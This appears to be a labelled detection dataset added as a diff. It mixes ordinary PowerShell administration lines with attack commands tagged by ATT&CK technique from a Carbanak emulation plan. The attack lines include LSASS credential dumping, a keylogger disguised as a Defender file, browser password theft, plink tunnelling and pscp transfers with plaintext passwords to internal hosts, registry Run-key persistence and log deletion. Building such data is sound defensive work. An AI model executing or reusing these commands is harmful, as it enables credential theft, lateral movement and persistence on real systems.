@@ -1,0 +1,92 @@
+Get-Service -Name 'wuauserv' -ComputerName 'localhost' -Status     // LABEL: BENIGN-POWERSHELL-COMMAND
+powershell.exe -ExecutionPolicy Bypass -File .\take-screenshot.ps1     // GROUND-TRUTH : T1113: Screen Capture (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Import-Csv C:\scripts\users.csv -Delimiter ';' -Header Name,Department,Position     // LABEL: BENIGN-POWERSHELL-COMMAND
+Start-Process cmd -ArgumentList '/c echo This is a simple benign command'     // LABEL: BENIGN-POWERSHELL-COMMAND
+cmd.exe /c 'REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /f /v "{018247B2CAC14652E}" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'     // GROUND-TRUTH : T1112: Modify Registry (defense-evasion) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+$env:USERPROFILE | ForEach-Object { Write-Output $_.FullName }     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item reverse.ps1 LanCradDriver.ps1;
+powershell.exe -ExecutionPolicy Bypass -NoExit -File LanCradDriver.ps1     // GROUND-TRUTH : T1140: Deobfuscate/Decode Files or Information (defense-evasion) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Get-ADComputer -Filter {Name -eq 'Server02'} -Properties Enabled,LastLogonDate | Format-Table Name,Enabled,LastLogonDate | Out-File C:\ADComputers.csv     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Users\Public\Documents\Excel Workbooks\*' -Destination 'C:\Backup\Documents' -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-EventLog -LogName Application | Where-Object {$_.EntryType -eq 'Error' -and $_.Message -like '*Service failed to start*'} | Out-File C:\ServiceErrors.log     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem 'C:\Windows\System32' -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName -Unique | Out-File 'C:\BenignScripts.txt'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem -Path 'C:\Windows\Temp' -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Users\John\Documents' -Destination 'E:\Backup\Documents' -Recurse     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item attackkatz.exe smrs.exe;
+powershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1 "cmd.exe /C $pwd\smrs.exe > $pwd\MGsCOxPSNK.txt"     // GROUND-TRUTH : T1003.001: OS Credential Dumping: LSASS Memory (credential-dumping) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+cat MGsCOxPSNK.txt;     // GROUND-TRUTH : T1003.001: OS Credential Dumping: LSASS Memory (credential-dumping) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Start-Process cmd -ArgumentList '/c echo This is a simple benign command'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-EventLog -LogName Application -Newest 10 -Message *     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item -ItemType Directory -Force C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver;
+Move-Item pscp.exe C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe;
+Move-Item psexec.py C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py;
+Move-Item impacket_exe C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime;\nMove-Item plink.exe C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe;
+Move-Item tiny.exe C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe; // GROUND-TRUTH : T1105: Ingress Tool Transfer (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default-args
+$env:ProgramFiles=\C:\Program Files (x86)\""     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-WinEvent -LogName Application -FilterXPath '*[System[Provider[@Name='Microsoft-Windows-PowerShell']]]' | Where-Object {$_.LevelDisplayName -like 'Warning' -and $_.Message -like 'Login failed*' } | Select-Object -First 5     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item -ItemType Directory -Path 'C:\ProgramData\AppData' -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Format-Table Name, DisplayName -AutoSize     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Connection -ComputerName 'server01' -Count 1 -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Set-ExecutionPolicy Unrestricted     // LABEL: BENIGN-POWERSHELL-COMMAND
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"79a&LbjM@MlW8XZa\" C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py kmitnick@10.0.0.7:/tmp/psexec.py;
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"79a&LbjM@MlW8XZa\" C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime kmitnick@10.0.0.7:/tmp/runtime;
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"79a&LbjM@MlW8XZa\" C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe kmitnick@10.0.0.7:/tmp/tiny; // GROUND-TRUTH : T1570: Lateral Tool Transfer (lateral-movement) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Test-Connection -ComputerName '192.168.1.1' -Count 3 -Quiet     // LABEL: BENIGN-POWERSHELL-COMMAND
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe kmitnick@10.0.0.7 -pw 79a&LbjM@MlW8XZa  // GROUND-TRUTH : T1021.004: Remote Services: SSH (lateral-movement) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item tiny.exe C:\Windows\tiny.exe;
+C:\Windows\tiny.exe 192.168.0.4 8080     // GROUND-TRUTH : T1571: Non-Standard Port (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+$env:TEMP | ForEach-Object { $_.FullName } | Sort-Object -Unique | Remove-Item -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Set-ExecutionPolicy Unrestricted     // LABEL: BENIGN-POWERSHELL-COMMAND
+Set-ExecutionPolicy Unrestricted -Scope Process -Force -Verbose     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\' -Name 'ExecutionPolicy' -Value 'Unrestricted' -PropertyType 'String' -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Content C:\Reports\MonthlyReport.txt | Format-List -Property Path,Modified,Length -Verbose     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path C:\Windows     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADUser -Filter {Name -like 'J*'} -Properties Enabled | Export-Csv 'C:\ADUsers.csv' -NoTypeInformation     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Windows\System32\LogFiles\*' -Destination 'C:\Backup\System32' -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADComputer -Identity 'cfo' -Properties *     // GROUND-TRUTH : T1018: Remote System Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Copy-Item C:\Windows\System32\*.* C:\Backup -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path -Path 'C:\Windows\System32\drivers\etc\hosts'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item plink.exe C:\\Windows\\Temp\\plink.exe;
+echo n | C:\\Windows\\Temp\\plink.exe -pw "azsxdcAZSXDC123" alfred@192.168.0.4 -R 3389:localhost:3389   // GROUND-TRUTH : T1572: Protocol Tunneling (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Copy-Item C:\Windows\System32\drivers\*.sys C:\Backup -Recurse     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+qwinsta /server:cfo     // GROUND-TRUTH : T1033: System Owner/User Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Set-ExecutionPolicy Bypass -Scope Process -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item C:\Logs\*.log C:\Backup\Logs -Recurse -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item C:\temp\script.ps1 -Type File -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -ErrorAction SilentlyContinue | ForEach-Object { if ($_.DisableTaskMgr -eq 1) { Write-Output 'Task Manager can be disabled.' } else { Write-Output 'Task Manager cannot be disabled.' } }     // LABEL: BENIGN-POWERSHELL-COMMAND
+Invoke-Sqlcmd -Query 'SELECT * FROM Users' -Database 'MyDB' -ServerInstance 'localhost'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs;
+echo Dim strArgs >> C:\Users\Public\Java-Update.vbs;
+echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs;
+echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs     // GROUND-TRUTH : T1105: Ingress Tool Transfer (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Test-Path C:\Logs\ -PathType Container     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service | Where-Object {$_.Status -eq 'Stopped'} | ForEach-Object {$_.Start-Service}     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path -Path 'C:\Windows\System32\System32\WindowsPowerShell\v1.0\Modules\' -PathType Container     // LABEL: BENIGN-POWERSHELL-COMMAND
+cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs     // GROUND-TRUTH : T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (persistence) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Set-Service -StartupType Disabled     // LABEL: BENIGN-POWERSHELL-COMMAND
+$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADComputer -Filter {Name -like 'Server*'} -Properties OperatingSystem -ExpandProperty OperatingSystem | Out-File 'C:\ComputerDetails.txt'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item keylogger.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe;
+C:\\Users\\jsmith\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe  // GROUND-TRUTH : T1056.001: Input Capture: Keylogging (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Get-WmiObject Win32_OperatingSystem | Select-Object -Property Caption, CSName, InstallDate | Out-File C:\Win32OS.csv     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Source\*' -Destination 'C:\Destination\' -Recurse -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+$env:TEMP=\C:\Temp\Workspace\""     // LABEL: BENIGN-POWERSHELL-COMMAND
+type C:\\Users\\jsmith\\AppData\\Local\\Temp\\klog2.txt    // GROUND-TRUTH : T1056.001: Input Capture: Keylogging (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Move-Item dumpWebCreds.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\infosMin48.exe;
+C:\\Users\\jsmith\\AppData\\Local\\Temp\\infosMin48.exe -i -H   // GROUND-TRUTH : T1555.003: Credentials from Password Stores: Credentials from Web Browsers (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Get-EventLog -LogName System | Where-Object {$_.EntryType -eq 'Warning' -and $_.Message -like 'Disk C:*' -and $_.TimeGenerated -gt (Get-Date).AddDays(-7)} | Select-Object -First 15     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-EventLog -LogName Application | Where-Object {$_.EntryType -eq 'Error' -and $_.Source -eq 'System' -and $_.Message -like '*File Not Found*'} | Select-Object -First 10     // LABEL: BENIGN-POWERSHELL-COMMAND
+Stop-Process -Name DefenderUpgradeExec;
+Remove-Item $env:TEMP\* -Recurse -Force -Erroraction 'silentlycontinue'     // GROUND-TRUTH : T1070.004: Indicator Removal on Host: File Deletion (defense-evasion) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Remove-Item -Path C:\Windows\Temp -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Mailbox -Identity user@example.com -Database mailbox_database -PrimarySmtpAddress user@example.com     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service -Name 'wuauserv' -ComputerName localhost -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq 'notepad.exe'} | Format-Table Name, Path -AutoSize     // LABEL: BENIGN-POWERSHELL-COMMAND
+Start-Transcript -Path 'C:\Logs\Session.txt' -Append     // LABEL: BENIGN-POWERSHELL-COMMAND
+Start-Process cmd -ArgumentList '/c echo This is a simple command'     // LABEL: BENIGN-POWERSHELL-COMMAND
